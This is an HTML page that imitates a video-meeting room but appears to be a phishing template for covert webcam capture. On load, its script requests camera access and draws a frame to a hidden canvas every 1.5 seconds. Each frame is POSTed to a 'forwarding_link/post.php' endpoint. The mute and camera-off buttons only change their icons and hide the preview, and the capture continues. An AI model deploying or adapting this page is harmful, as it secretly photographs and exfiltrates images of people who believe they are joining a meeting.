<!doctype html>
<html>

<head>
  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<style>
  @import url("https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap");

  body {
    height: 100vh;
    width: 100vw;
    background: #202124;
    overflow: hidden;
  }

  * {
    padding: 0px;
    margin: 0px;
    font-family: 'Google Sans', 'Roboto', sans-serif;
    box-sizing: border-box;
  }

  .main-container {
    height: 100vh;
    width: 100%;
    background: #202124;
    position: relative;
    display: flex;
    flex-direction: column;
  }

  .top-bar {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    height: 60px;
    background: rgba(32, 33, 36, 0.9);
    backdrop-filter: blur(10px);
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 24px;
    z-index: 100;
  }

  .meeting-info {
    display: flex;
    align-items: center;
    gap: 12px;
  }

  .meeting-title {
    color: #e8eaed;
    font-size: 16px;
    font-weight: 500;
  }

  .meeting-time {
    color: #9aa0a6;
    font-size: 14px;
  }

  .top-controls {
    display: flex;
    align-items: center;
    gap: 12px;
  }

  .info-button, .menu-button {
    background: none;
    border: none;
    color: #e8eaed;
    font-size: 20px;
    padding: 8px;
    border-radius: 50%;
    cursor: pointer;
    transition: background-color 0.2s;
  }

  .info-button:hover, .menu-button:hover {
    background: rgba(232, 234, 237, 0.08);
  }

  .video-container {
    flex: 1;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 80px 20px 100px;
  }

  .video-wrap {
    position: relative;
    background: #000;
    border-radius: 12px;
    overflow: hidden;
    max-width: 90%;
    max-height: 90%;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  }

  #video {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
  }

  #canvas {
    display: none;
  }

  .participant-label {
    position: absolute;
    bottom: 12px;
    left: 12px;
    background: rgba(0, 0, 0, 0.6);
    color: white;
    padding: 4px 8px;
    border-radius: 4px;
    font-size: 14px;
    backdrop-filter: blur(4px);
  }

  .bottom-bar {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    height: 80px;
    background: rgba(32, 33, 36, 0.95);
    backdrop-filter: blur(10px);
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 0 24px;
    border-top: 1px solid rgba(255, 255, 255, 0.08);
  }

  .controls-left, .controls-right {
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .controls-center {
    display: flex;
    align-items: center;
    gap: 16px;
    margin: 0 auto;
  }

  .control-button {
    background: rgba(255, 255, 255, 0.1);
    border: none;
    color: #e8eaed;
    width: 48px;
    height: 48px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.2s ease;
    font-size: 20px;
  }

  .control-button:hover {
    background: rgba(255, 255, 255, 0.15);
    transform: scale(1.05);
  }

  .control-button.active {
    background: #1a73e8;
  }

  .control-button.muted {
    background: #ea4335;
  }

  .control-button.disabled {
    background: #5f6368;
    color: #9aa0a6;
  }

  .end-call-button {
    background: #ea4335;
    border: none;
    color: white;
    width: 48px;
    height: 48px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.2s ease;
    font-size: 20px;
  }

  .end-call-button:hover {
    background: #d93025;
    transform: scale(1.05);
  }

  .more-options {
    background: none;
    border: none;
    color: #e8eaed;
    font-size: 20px;
    padding: 12px;
    border-radius: 50%;
    cursor: pointer;
    transition: background-color 0.2s;
  }

  .more-options:hover {
    background: rgba(232, 234, 237, 0.08);
  }

  .waiting-popup {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.7);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1000;
  }

  .popup-content {
    background: #303134;
    padding: 32px;
    border-radius: 12px;
    text-align: center;
    max-width: 400px;
    margin: 20px;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
  }

  .popup-content h2 {
    color: #e8eaed;
    font-size: 20px;
    font-weight: 500;
    margin-bottom: 16px;
  }

  .popup-content p {
    color: #9aa0a6;
    font-size: 14px;
    line-height: 1.4;
  }

  .loading-dots {
    display: inline-block;
    margin-left: 4px;
  }

  .loading-dots span {
    animation: loading 1.4s infinite ease-in-out;
    display: inline-block;
    width: 4px;
    height: 4px;
    border-radius: 50%;
    background-color: #1a73e8;
    margin: 0 1px;
  }

  .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
  .loading-dots span:nth-child(2) { animation-delay: -0.16s; }

  @keyframes loading {
    0%, 80%, 100% { opacity: 0.3; }
    40% { opacity: 1; }
  }

  .participants-grid {
    position: absolute;
    top: 16px;
    right: 16px;
    background: rgba(0, 0, 0, 0.6);
    color: white;
    padding: 4px 8px;
    border-radius: 4px;
    font-size: 12px;
    backdrop-filter: blur(4px);
  }
</style>

<body>
  <!-- Top Bar -->
  <div class="top-bar">
    <div class="meeting-info">
      <span class="meeting-title">Meeting Room</span>
      <span class="meeting-time" id="meeting-time">10:30 AM</span>
    </div>
    <div class="top-controls">
      <button class="info-button" title="Meeting details">
        <i class="fas fa-info-circle"></i>
      </button>
      <button class="menu-button" title="More options">
        <i class="fas fa-ellipsis-v"></i>
      </button>
    </div>
  </div>

  <!-- Main Video Container -->
  <div class="main-container">
    <div class="video-container">
      <div class="video-wrap">
        <video id="video" playsinline autoplay></video>
        <div class="participant-label">You</div>
        <div class="participants-grid">1 participant</div>
      </div>
    </div>
  </div>

  <center><canvas id="canvas" width="640" height="480"></canvas></center>

  <!-- Bottom Controls -->
  <div class="bottom-bar">
    <div class="controls-left">
      <button class="more-options" title="More options">
        <i class="fas fa-ellipsis-h"></i>
      </button>
    </div>
    
    <div class="controls-center">
      <button class="control-button" id="mic-button" title="Turn off microphone">
        <i class="fas fa-microphone"></i>
      </button>
      <button class="control-button" id="camera-button" title="Turn off camera">
        <i class="fas fa-video"></i>
      </button>
      <button class="control-button" title="Share screen">
        <i class="fas fa-desktop"></i>
      </button>
      <button class="end-call-button" title="Leave call">
        <i class="fas fa-phone-slash"></i>
      </button>
    </div>

    <div class="controls-right">
      <button class="control-button" title="Chat">
        <i class="fas fa-comment"></i>
      </button>
      <button class="control-button" title="Show participants">
        <i class="fas fa-users"></i>
      </button>
      <button class="control-button" title="More options">
        <i class="fas fa-ellipsis-h"></i>
      </button>
    </div>
  </div>

  <!-- Waiting Popup -->
  <div class="waiting-popup" id="waiting-popup">
    <div class="popup-content">
      <h2>Getting ready...</h2>
      <p>Setting up your meeting room<span class="loading-dots"><span></span><span></span><span></span></span></p>
    </div>
  </div>

  <script>
    function post(imgdata) {
      $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function (result) {
          // call the function that handles the response/results
        },
        error: function () {
        }
      });
    }

    'use strict';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const micButton = document.getElementById('mic-button');
    const cameraButton = document.getElementById('camera-button');

    const constraints = {
      audio: false,
      video: {
        facingMode: "user"
      }
    };

    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        console.error(`navigator.getUserMedia error: ${e.toString()}`);
      }
    }

    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

      var context = canvas.getContext('2d');
      setInterval(function () {
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
        video.play();
      }, 1500);
    }

    // Control button interactions
    let micMuted = false;
    let cameraOff = false;

    micButton.addEventListener('click', function() {
      micMuted = !micMuted;
      if (micMuted) {
        micButton.classList.add('muted');
        micButton.innerHTML = '<i class="fas fa-microphone-slash"></i>';
        micButton.title = 'Turn on microphone';
      } else {
        micButton.classList.remove('muted');
        micButton.innerHTML = '<i class="fas fa-microphone"></i>';
        micButton.title = 'Turn off microphone';
      }
    });

    cameraButton.addEventListener('click', function() {
      cameraOff = !cameraOff;
      if (cameraOff) {
        cameraButton.classList.add('muted');
        cameraButton.innerHTML = '<i class="fas fa-video-slash"></i>';
        cameraButton.title = 'Turn on camera';
        video.style.display = 'none';
      } else {
        cameraButton.classList.remove('muted');
        cameraButton.innerHTML = '<i class="fas fa-video"></i>';
        cameraButton.title = 'Turn off camera';
        video.style.display = 'block';
      }
    });

    // Update time
    function updateTime() {
      const now = new Date();
      const timeString = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
      document.getElementById('meeting-time').textContent = timeString;
    }

    // Hide waiting popup after delay
    function hideWaitingPopup() {
      document.getElementById('waiting-popup').style.display = 'none';
    }

    // Initialize
    init();
    updateTime();
    setInterval(updateTime, 60000); // Update time every minute

    $(document).ready(function(){
      setTimeout(function(){
        hideWaitingPopup();
      }, 3000); // Hide popup after 3 seconds
    });
  </script>
</body>

</html>
